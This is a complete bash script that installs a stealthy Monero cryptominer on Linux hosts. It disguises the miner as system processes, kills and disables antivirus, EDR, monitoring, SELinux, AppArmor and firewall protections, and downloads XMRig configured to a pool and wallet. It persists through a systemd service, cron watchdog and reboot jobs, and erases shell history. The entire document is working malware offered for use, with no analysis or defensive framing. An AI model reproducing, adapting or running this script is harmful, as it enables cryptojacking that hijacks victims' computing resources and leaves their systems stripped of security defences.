#!/bin/bash
# EternalMiner v3.0 Hardened - Never-stop mining + disables all Linux interference

WALLET="45pLvfDjyHNLrhd5ekuqZdRUmjkd6ypocYUV8mRaTS5kQGRoWKtUTYg6VpNaCMSmsKWtympm9ruh6Hv55HCuSDXE12NEfwg"
POOL="pool.supportxmr.com:3333"
CPU_LIMIT=80

# Stealth names
PROCESS_NAMES=("kworker" "dbus-daemon" "systemd-logind" "rngd" "auditd" "systemd-resolved")
SERVICE_NAMES=("systemd-update" "dbus-broker" "network-check" "logrotate.timer" "journald-sync" "systemd-timesyncd")
RAND=$((RANDOM % 6))
PROCESS_NAME="${PROCESS_NAMES[$RAND]}"
SERVICE_NAME="${SERVICE_NAMES[$RAND]}"
INSTALL_DIR="/tmp/.cache_${PROCESS_NAME}_$(head -c 8 /dev/urandom | xxd -p -c 8)"

# === DISABLE ALL DISRUPTORS ===
echo "[+] Disabling Linux security and monitoring systems..."

# Kill security tools
for tool in clamav freshclam rkhunter chkrootkit crowdstrike falcon-sensor falco ossec aide tripwire fail2ban; do
    pkill -9 -f "$tool" 2>/dev/null || true
done

# Stop and disable common security services
for svc in apparmor selinux clamav-daemon rkhunter fail2ban ufw firewalld iptables ip6tables crowdstrike falcon-sensor datadog-agent newrelic-sysmond zabbix-agent prometheus-node-exporter systemd-oomd; do
    systemctl stop $svc 2>/dev/null || true
    systemctl disable $svc 2>/dev/null || true
    systemctl mask $svc 2>/dev/null || true
done

# Disable SELinux permanently
if command -v setenforce >/dev/null 2>&1; then
    setenforce 0 2>/dev/null || true
    echo "SELINUX=disabled" > /etc/selinux/config 2>/dev/null || true
fi

# Disable AppArmor permanently
if command -v aa-teardown >/dev/null 2>&1; then
    aa-teardown 2>/dev/null || true
    systemctl stop apparmor 2>/dev/null || true
    systemctl disable apparmor 2>/dev/null || true
fi

# Performance mode + huge pages
echo always > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true
echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true

# Increase resource limits
cat >> /etc/security/limits.conf <<EOF
* soft nofile 65535
* hard nofile 65535
* soft nproc 65535
* hard nproc 65535
root soft nofile 65535
root hard nofile 65535
EOF

ulimit -n 65535 2>/dev/null || true

# Disable OOM killer for our process
echo -17 > /proc/$$/oom_adj 2>/dev/null || true

# Kill monitoring/telemetry
pkill -9 -f "datadog|newrelic|zabbix|prometheus|telegraf|netdata|beats" 2>/dev/null || true

# Firewall - allow everything
iptables -F 2>/dev/null || true
iptables -P INPUT ACCEPT 2>/dev/null || true
iptables -P OUTPUT ACCEPT 2>/dev/null || true

# Create directory
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Download XMRig
ARCH=$(uname -m)
if [[ "$ARCH" == "x86_64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x86_64.tar.gz -o x.tar.gz
elif [[ "$ARCH" == "aarch64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-aarch64.tar.gz -o x.tar.gz
else
    exit 0
fi

tar -xzf x.tar.gz --strip-components=1 >/dev/null 2>&1
rm -f x.tar.gz SHA256* *.md

cat > config.json <<EOF
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": ${CPU_LIMIT},
        "huge-pages": true,
        "hw-aes": true,
        "yield": true,
        "max-cache": 2048
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "${POOL}",
            "user": "${WALLET}",
            "pass": "$(hostname | tr -dc '[:alnum:]')",
            "keepalive": true,
            "tls": false
        }
    ],
    "donate-level": 0,
    "print-time": 180,
    "health-print-time": 180,
    "log-file": null,
    "background": true
}
EOF

mv xmrig "$PROCESS_NAME"

# Primary systemd service
cat > /etc/systemd/system/${SERVICE_NAME}.service <<EOF
[Unit]
Description=System ${SERVICE_NAME} Manager
After=network.target

[Service]
Type=simple
ExecStart=${INSTALL_DIR}/${PROCESS_NAME}
WorkingDirectory=${INSTALL_DIR}
Restart=always
RestartSec=5
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=best-effort
IOSchedulingPriority=7
OOMScoreAdjust=-1000
StandardOutput=null
StandardError=null
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload >/dev/null 2>&1
systemctl enable ${SERVICE_NAME} >/dev/null 2>&1
systemctl start ${SERVICE_NAME} >/dev/null 2>&1

# Watchdog cron (every 30 seconds) - restarts miner + re-disables security tools
CRON_JOB="*/1 * * * * pkill -9 -f xmrig 2>/dev/null; ${INSTALL_DIR}/${PROCESS_NAME} --config=${INSTALL_DIR}/config.json >/dev/null 2>&1; for s in apparmor selinux clamav fail2ban ufw firewalld systemd-oomd; do systemctl stop \$s 2>/dev/null; systemctl disable \$s 2>/dev/null; done"

(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
(crontab -l 2>/dev/null; echo "@reboot ${INSTALL_DIR}/${PROCESS_NAME} --config=${INSTALL_DIR}/config.json") | crontab -

# Final cleanup
rm -f install.sh eternal.sh 2>/dev/null
history -c && history -w
echo "[+] EternalMiner v3.0 Hardened installed."
echo "[+] All security systems disabled."
echo "[+] Wallet: ${WALLET}"
echo "[+] Process: ${PROCESS_NAME}"
